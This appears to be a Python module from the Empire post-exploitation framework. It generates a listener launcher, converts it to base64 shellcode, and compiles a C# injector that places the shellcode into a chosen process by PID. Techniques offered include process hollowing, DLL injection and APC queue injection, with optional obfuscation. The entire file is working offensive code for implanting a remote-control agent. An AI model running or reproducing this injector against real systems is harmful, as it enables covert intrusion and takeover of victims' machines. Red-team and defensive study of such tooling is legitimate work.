from typing import Dict

import donut
import yaml

from empire.server.common import helpers
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        pid = params["pid"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscation_command = params["ObfuscateCommand"]
        language = params["Language"]
        dot_net_version = params["DotNetVersion"].lower()
        arch = params["Architecture"]
        launcher_obfuscation = params["Obfuscate"]

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        launcher = main_menu.stagers.generate_launcher(
            listener_name,
            language=language,
            encode=False,
            obfuscate=launcher_obfuscation,
            obfuscation_command=launcher_obfuscation_command,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
        )

        if not launcher or launcher == "" or launcher.lower() == "failed":
            return handle_error_message("[!] Invalid listener: " + listener_name)

        if language.lower() == "powershell":
            shellcode = main_menu.stagers.generate_powershell_shellcode(
                launcher, arch=arch, dot_net_version=dot_net_version
            )

        elif language.lower() == "csharp":
            if arch == "x86":
                arch_type = 1
            elif arch == "x64":
                arch_type = 2
            elif arch == "both":
                arch_type = 3
            directory = f"{main_menu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
            shellcode = donut.create(file=directory, arch=arch_type)

        elif language.lower() == "ironpython":
            if dot_net_version == "net35":
                return (
                    None,
                    "[!] IronPython agent only supports NetFramework 4.0 and above.",
                )
            shellcode = main_menu.stagers.generate_python_shellcode(
                launcher, arch=arch, dot_net_version="net40"
            )

        base64_shellcode = helpers.encode_base64(shellcode).decode("UTF-8")

        compiler = main_menu.pluginsv2.get_by_id("csharpserver")
        if not compiler.status == "ON":
            return None, "csharpserver plugin not running"

        # Convert compiler.yaml to python dict
        compiler_dict: Dict = yaml.safe_load(module.compiler_yaml)
        # delete the 'Empire' key
        del compiler_dict[0]["Empire"]
        # convert back to yaml string
        compiler_yaml: str = yaml.dump(compiler_dict, sort_keys=False)

        file_name = compiler.do_send_message(
            compiler_yaml, module.name, confuse=obfuscate
        )
        if file_name == "failed":
            return None, "module compile failed"

        script_file = (
            main_menu.installPath
            + "/csharp/Covenant/Data/Tasks/CSharp/Compiled/"
            + (params["DotNetVersion"]).lower()
            + "/"
            + file_name
            + ".compiled"
        )

        if params["Technique"] == "Vanilla Process Injection":
            t = "1"
        elif params["Technique"] == "DLL Injection":
            t = "2"
        elif params["Technique"] == "Process Hollowing":
            t = "3"
        elif params["Technique"] == "APC Queue Injection":
            t = "4"
        elif params["Technique"] == "Dynamic Invoke":
            t = "5"

        script_end = f",/t:{t} /pid:{pid} /f:base64 /sc:{base64_shellcode}"
        return f"{script_file}|{script_end}", None
